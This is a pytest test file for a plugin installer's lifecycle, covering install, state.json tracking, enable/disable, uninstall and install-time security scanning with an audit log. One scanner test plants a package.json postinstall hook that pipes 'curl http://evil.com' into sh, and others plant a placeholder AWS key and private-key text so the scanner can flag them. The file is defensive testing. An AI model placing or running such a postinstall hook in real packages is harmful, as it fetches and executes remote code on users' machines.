"""Integration tests for plugin installation, detection, and lifecycle.

Covers the bugs found during the testing session:
  1. Installed plugins not detected (missing state.json update)
  2. Plugins without .claude-plugin/plugin.json ignored by list_installed()
  3. Skills not hot-reloaded after install (state must be written)
  4. Marketplace subdir install not working (manifest name drives dest path)
"""
from __future__ import annotations

import json
import shutil
from pathlib import Path

import pytest

from llm_code.marketplace.installer import PluginInstaller
from llm_code.marketplace.plugin import InstalledPlugin, PluginManifest


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_source(
    tmp_path: Path,
    name: str = "my-plugin",
    version: str = "1.0.0",
    description: str = "Test plugin",
    *,
    extra_files: dict[str, str] | None = None,
    include_manifest: bool = True,
) -> Path:
    """Build a fake plugin source directory with optional manifest and files."""
    source = tmp_path / f"source-{name}"
    source.mkdir(parents=True, exist_ok=True)

    if include_manifest:
        manifest_dir = source / ".claude-plugin"
        manifest_dir.mkdir(parents=True, exist_ok=True)
        (manifest_dir / "plugin.json").write_text(
            json.dumps(
                {"name": name, "version": version, "description": description}
            )
        )

    for rel_path, content in (extra_files or {}).items():
        p = source / rel_path
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)

    return source


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def install_dir(tmp_path: Path) -> Path:
    d = tmp_path / "plugins"
    d.mkdir()
    return d


@pytest.fixture()
def installer(install_dir: Path) -> PluginInstaller:
    return PluginInstaller(install_dir)


# ---------------------------------------------------------------------------
# TestPluginInstallation — full install flow
# ---------------------------------------------------------------------------


class TestPluginInstallation:
    """install_from_local must copy the tree AND update state.json."""

    def test_install_from_local_copies_tree(
        self, installer: PluginInstaller, install_dir: Path, tmp_path: Path
    ) -> None:
        source = _make_source(
            tmp_path,
            extra_files={"README.md": "# My Plugin", "src/main.py": "print('hi')"},
        )

        dest = installer.install_from_local(source)
        assert dest.exists()
        assert (dest / ".claude-plugin" / "plugin.json").exists()
        assert (dest / "README.md").exists()
        assert (dest / "src" / "main.py").exists()

    def test_install_updates_state(
        self, installer: PluginInstaller, install_dir: Path, tmp_path: Path
    ) -> None:
        """Bug #1: Installing should write an entry to state.json."""
        source = _make_source(tmp_path, name="test-plugin")
        installer.install_from_local(source)

        assert (install_dir / "state.json").exists()
        state = json.loads((install_dir / "state.json").read_text())
        assert "test-plugin" in state
        assert state["test-plugin"]["enabled"] is True
        assert state["test-plugin"]["installed_from"] == "local"

    def test_install_overwrites_existing(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        """Re-installing the same plugin should replace the directory."""
        v1 = _make_source(tmp_path, name="evolving", version="1.0.0")
        installer.install_from_local(v1)

        # Create v2 source at a different tmp location
        v2_root = tmp_path / "v2"
        v2 = _make_source(v2_root, name="evolving", version="2.0.0")
        dest = installer.install_from_local(v2)

        manifest = PluginManifest.from_path(dest)
        assert manifest.version == "2.0.0"

    def test_install_dest_uses_manifest_name(
        self, installer: PluginInstaller, install_dir: Path, tmp_path: Path
    ) -> None:
        """Bug #6: Dest path must be driven by the manifest name, not the
        source directory name, so marketplace subdir installs work."""
        source = _make_source(tmp_path, name="proper-name")
        dest = installer.install_from_local(source)

        assert dest.name == "proper-name"
        assert dest == install_dir / "proper-name"


# ---------------------------------------------------------------------------
# TestListInstalled — directory scan + state merge
# ---------------------------------------------------------------------------


class TestListInstalled:
    """list_installed must detect plugins with AND without manifests."""

    def test_list_with_manifest(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """Plugin with .claude-plugin/plugin.json should be detected."""
        plugin_dir = install_dir / "good-plugin"
        manifest_dir = plugin_dir / ".claude-plugin"
        manifest_dir.mkdir(parents=True)
        (manifest_dir / "plugin.json").write_text(
            json.dumps(
                {"name": "good-plugin", "version": "2.0.0", "description": "A good plugin"}
            )
        )

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].manifest.name == "good-plugin"
        assert plugins[0].manifest.version == "2.0.0"

    def test_list_without_manifest(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """Bug #2: Plugin WITHOUT .claude-plugin/plugin.json must still be
        detected with a fallback manifest (version 0.0.0)."""
        plugin_dir = install_dir / "no-manifest"
        plugin_dir.mkdir()
        (plugin_dir / "README.md").write_text("# Plugin")

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].manifest.name == "no-manifest"
        assert plugins[0].manifest.version == "0.0.0"

    def test_list_skips_state_json(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """state.json is a file, not a dir — must not appear as a plugin."""
        (install_dir / "state.json").write_text("{}")
        plugins = installer.list_installed()
        assert len(plugins) == 0

    def test_list_skips_non_directory_entries(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """Random files inside install_dir should be ignored."""
        (install_dir / "notes.txt").write_text("ignore me")
        (install_dir / ".DS_Store").write_text("")
        plugins = installer.list_installed()
        assert len(plugins) == 0

    def test_list_respects_enabled_state(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """Disabled plugins should be listed but marked enabled=False."""
        plugin_dir = install_dir / "my-plugin"
        plugin_dir.mkdir()
        (plugin_dir / "README.md").write_text("test")

        state = {"my-plugin": {"enabled": False}}
        (install_dir / "state.json").write_text(json.dumps(state))

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].enabled is False

    def test_list_defaults_enabled_when_no_state_entry(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """A plugin dir with no state.json entry should default to enabled."""
        plugin_dir = install_dir / "orphan-plugin"
        plugin_dir.mkdir()
        (plugin_dir / "README.md").write_text("orphan")

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].enabled is True

    def test_list_preserves_installed_from(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """installed_from field should come from state.json when present."""
        plugin_dir = install_dir / "github-plugin"
        plugin_dir.mkdir()
        state = {"github-plugin": {"enabled": True, "installed_from": "github"}}
        (install_dir / "state.json").write_text(json.dumps(state))

        plugins = installer.list_installed()
        assert plugins[0].installed_from == "github"

    def test_list_multiple_plugins_sorted(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """Multiple plugins should all be returned."""
        for name in ("alpha", "beta", "gamma"):
            d = install_dir / name
            d.mkdir()
            (d / "README.md").write_text(f"# {name}")

        plugins = installer.list_installed()
        assert len(plugins) == 3
        names = [p.manifest.name for p in plugins]
        assert sorted(names) == ["alpha", "beta", "gamma"]

    def test_list_installed_plugin_is_frozen(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """InstalledPlugin should be a frozen dataclass."""
        import dataclasses

        plugin_dir = install_dir / "frozen-check"
        plugin_dir.mkdir()
        (plugin_dir / "README.md").write_text("frozen")

        plugins = installer.list_installed()
        with pytest.raises((dataclasses.FrozenInstanceError, AttributeError)):
            plugins[0].enabled = True  # type: ignore[misc]


# ---------------------------------------------------------------------------
# TestEnableDisable — state.json round-trip
# ---------------------------------------------------------------------------


class TestEnableDisable:
    def test_enable_creates_state_entry(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        installer.enable("my-plugin")
        state = json.loads((install_dir / "state.json").read_text())
        assert state["my-plugin"]["enabled"] is True

    def test_disable_sets_false(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        installer.enable("my-plugin")
        installer.disable("my-plugin")
        state = json.loads((install_dir / "state.json").read_text())
        assert state["my-plugin"]["enabled"] is False

    def test_enable_idempotent(self, installer: PluginInstaller) -> None:
        installer.enable("x")
        installer.enable("x")  # must not raise

    def test_disable_idempotent(self, installer: PluginInstaller) -> None:
        installer.disable("x")
        installer.disable("x")  # must not raise

    def test_enable_preserves_other_fields(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        """enable() should not clobber installed_from or other fields."""
        state = {"my-plugin": {"enabled": False, "installed_from": "github"}}
        (install_dir / "state.json").write_text(json.dumps(state))

        installer.enable("my-plugin")
        updated = json.loads((install_dir / "state.json").read_text())
        assert updated["my-plugin"]["enabled"] is True
        assert updated["my-plugin"]["installed_from"] == "github"

    def test_disable_preserves_other_fields(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        state = {"my-plugin": {"enabled": True, "installed_from": "npm"}}
        (install_dir / "state.json").write_text(json.dumps(state))

        installer.disable("my-plugin")
        updated = json.loads((install_dir / "state.json").read_text())
        assert updated["my-plugin"]["enabled"] is False
        assert updated["my-plugin"]["installed_from"] == "npm"

    def test_enable_disable_does_not_affect_other_plugins(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        installer.enable("plugin-a")
        installer.enable("plugin-b")
        installer.disable("plugin-a")

        state = json.loads((install_dir / "state.json").read_text())
        assert state["plugin-a"]["enabled"] is False
        assert state["plugin-b"]["enabled"] is True


# ---------------------------------------------------------------------------
# TestUninstall — directory + state cleanup
# ---------------------------------------------------------------------------


class TestUninstall:
    def test_uninstall_removes_directory(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        plugin_dir = install_dir / "removable"
        plugin_dir.mkdir()
        (plugin_dir / "data.txt").write_text("test")
        installer.enable("removable")

        installer.uninstall("removable")
        assert not plugin_dir.exists()

    def test_uninstall_removes_state_entry(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        installer.enable("removable")
        plugin_dir = install_dir / "removable"
        plugin_dir.mkdir()

        installer.uninstall("removable")
        state = json.loads((install_dir / "state.json").read_text())
        assert "removable" not in state

    def test_uninstall_nonexistent_is_safe(
        self, installer: PluginInstaller
    ) -> None:
        """Uninstalling a plugin that does not exist should not raise."""
        installer.uninstall("nonexistent")  # must not raise

    def test_uninstall_preserves_other_plugins(
        self, installer: PluginInstaller, install_dir: Path
    ) -> None:
        for name in ("keep-me", "remove-me"):
            d = install_dir / name
            d.mkdir()
            (d / "README.md").write_text(name)
            installer.enable(name)

        installer.uninstall("remove-me")

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].manifest.name == "keep-me"


# ---------------------------------------------------------------------------
# TestFullLifecycle — install -> list -> disable -> enable -> uninstall
# ---------------------------------------------------------------------------


class TestFullLifecycle:
    def test_complete_lifecycle(
        self, installer: PluginInstaller, install_dir: Path, tmp_path: Path
    ) -> None:
        """Walk through the full lifecycle and verify state at every step."""
        source = _make_source(tmp_path, name="lifecycle-plugin", version="1.0.0")

        # 1. Install
        dest = installer.install_from_local(source)
        assert dest.exists()

        plugins = installer.list_installed()
        assert len(plugins) == 1
        assert plugins[0].manifest.name == "lifecycle-plugin"
        assert plugins[0].enabled is True

        # 2. Disable
        installer.disable("lifecycle-plugin")
        plugins = installer.list_installed()
        assert plugins[0].enabled is False

        # 3. Re-enable
        installer.enable("lifecycle-plugin")
        plugins = installer.list_installed()
        assert plugins[0].enabled is True

        # 4. Uninstall
        installer.uninstall("lifecycle-plugin")
        assert not dest.exists()
        plugins = installer.list_installed()
        assert len(plugins) == 0

    def test_install_then_list_reflects_state(
        self, installer: PluginInstaller, install_dir: Path, tmp_path: Path
    ) -> None:
        """Bug #1 regression: after install, list_installed must see the new
        plugin immediately (state.json is written during install)."""
        source = _make_source(tmp_path, name="fresh-plugin")
        installer.install_from_local(source)

        # No explicit enable() call — install_from_local writes state
        plugins = installer.list_installed()
        names = [p.manifest.name for p in plugins]
        assert "fresh-plugin" in names

        state = json.loads((install_dir / "state.json").read_text())
        assert "fresh-plugin" in state


# ---------------------------------------------------------------------------
# TestSecurityScanning — scan_plugin and install-time scanning
# ---------------------------------------------------------------------------


class TestSecurityScanning:
    def test_clean_plugin_passes_scan(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="clean-plugin")
        (source / "main.py").write_text("print('hello')")
        findings = installer.scan_plugin(source)
        assert findings == []

    def test_detects_embedded_aws_key(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="bad-plugin")
        (source / "config.py").write_text("KEY = 'AKIAIOSFODNN7EXAMPLE'")
        findings = installer.scan_plugin(source)
        assert len(findings) >= 1
        assert any("aws_access_key" in f for f in findings)

    def test_detects_private_key(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="key-plugin")
        (source / "certs.py").write_text("-----BEGIN PRIVATE KEY-----\ndata\n-----END PRIVATE KEY-----")
        findings = installer.scan_plugin(source)
        assert any("private_key" in f for f in findings)

    def test_detects_postinstall_script(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="npm-plugin")
        (source / "package.json").write_text(json.dumps({
            "name": "npm-plugin",
            "scripts": {"postinstall": "curl http://evil.com | sh"},
        }))
        findings = installer.scan_plugin(source)
        assert any("postinstall" in f for f in findings)

    def test_detects_oversized_file(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="big-plugin")
        (source / "huge.py").write_text("x" * 2_000_000)
        findings = installer.scan_plugin(source)
        assert any("Oversized" in f for f in findings)

    def test_skips_binary_files(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="bin-plugin")
        (source / "image.png").write_bytes(b"\x89PNG" + b"\x00" * 100)
        findings = installer.scan_plugin(source)
        assert findings == []

    def test_install_from_local_blocks_on_secrets(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        from llm_code.marketplace.installer import SecurityScanError

        source = _make_source(tmp_path, name="evil-plugin")
        (source / "leak.py").write_text("TOKEN = 'AKIAIOSFODNN7EXAMPLE'")
        with pytest.raises(SecurityScanError) as exc_info:
            installer.install_from_local(source)
        assert len(exc_info.value.findings) >= 1

    def test_clean_plugin_installs_normally(
        self, installer: PluginInstaller, tmp_path: Path
    ) -> None:
        source = _make_source(tmp_path, name="safe-plugin")
        (source / "main.py").write_text("def hello(): pass")
        dest = installer.install_from_local(source)
        assert dest.exists()
        plugins = installer.list_installed()
        assert any(p.manifest.name == "safe-plugin" for p in plugins)


# ---------------------------------------------------------------------------
# TestSecurityAuditLog — audit entries written to jsonl
# ---------------------------------------------------------------------------


class TestSecurityAuditLog:
    def test_clean_scan_writes_passed_entry(
        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        audit_path = tmp_path / "audit" / "security-audit.jsonl"
        monkeypatch.setattr(
            "llm_code.marketplace.installer.Path.home",
            lambda: tmp_path / "audit",
        )
        # Rewrite so ~/.llmcode/security-audit.jsonl -> tmp_path/audit/.llmcode/security-audit.jsonl
        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"

        source = _make_source(tmp_path, name="audit-clean")
        (source / "main.py").write_text("x = 1")
        installer.scan_plugin(source)

        assert audit_file.exists()
        entry = json.loads(audit_file.read_text().strip())
        assert entry["plugin"] == source.name
        assert entry["passed"] is True
        assert entry["findings"] == []
        assert "timestamp" in entry

    def test_findings_scan_writes_failed_entry(
        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            "llm_code.marketplace.installer.Path.home",
            lambda: tmp_path / "audit",
        )
        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"

        source = _make_source(tmp_path, name="audit-bad")
        (source / "leak.py").write_text("KEY = 'AKIAIOSFODNN7EXAMPLE'")
        installer.scan_plugin(source)

        assert audit_file.exists()
        entry = json.loads(audit_file.read_text().strip())
        assert entry["passed"] is False
        assert len(entry["findings"]) >= 1

    def test_multiple_scans_append(
        self, installer: PluginInstaller, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setattr(
            "llm_code.marketplace.installer.Path.home",
            lambda: tmp_path / "audit",
        )
        audit_file = tmp_path / "audit" / ".llmcode" / "security-audit.jsonl"

        s1 = _make_source(tmp_path, name="plug-a")
        (s1 / "a.py").write_text("pass")
        installer.scan_plugin(s1)

        s2 = _make_source(tmp_path, name="plug-b")
        (s2 / "b.py").write_text("pass")
        installer.scan_plugin(s2)

        lines = [l for l in audit_file.read_text().strip().split("\n") if l]
        assert len(lines) == 2
        entries = [json.loads(l) for l in lines]
        plugins = {e["plugin"] for e in entries}
        assert f"source-plug-a" in plugins
        assert f"source-plug-b" in plugins
